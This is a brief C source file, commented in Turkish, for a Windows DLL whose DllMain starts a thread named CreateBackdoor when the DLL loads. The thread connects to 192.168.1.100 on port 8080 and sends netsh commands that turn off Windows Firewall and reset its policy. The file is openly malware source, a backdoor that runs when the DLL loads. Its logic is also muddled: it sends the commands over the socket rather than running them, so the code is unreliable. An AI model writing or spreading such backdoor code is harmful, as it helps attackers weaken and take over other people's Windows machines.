#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

DWORD WINAPI CreateBackdoor(LPVOID lpParameter)
{
    // Ağ erişimi için gerekli yapılandırma
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    // Winsock kütüphanesini başlat
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Bir soket oluştur
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // Sunucu adresini ayarla
    server.sin_family = AF_INET;
    server.sin_port = htons(8080);
    server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Sunucu IP adresi

    // Sunucuya bağlan
    connect(sock, (SOCKADDR*)&server, sizeof(server));

    // Ağ erişimi için gerekli komutları gönder
    char* cmd = "netsh advfirewall set allprofiles state off";
    send(sock, cmd, strlen(cmd), 0);

    // Ağ erişimi için gerekli komutları gönder
    cmd = "netsh advfirewall set allprofiles firewallpolicy blockinboundalways,allowoutbound";
    send(sock, cmd, strlen(cmd), 0);

    // Soketi kapat
    closesocket(sock);

    // Winsock kütüphanesini sonlandır
    WSACleanup();

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, CreateBackdoor, NULL, 0, NULL);
        break;
    }

    return TRUE;
}
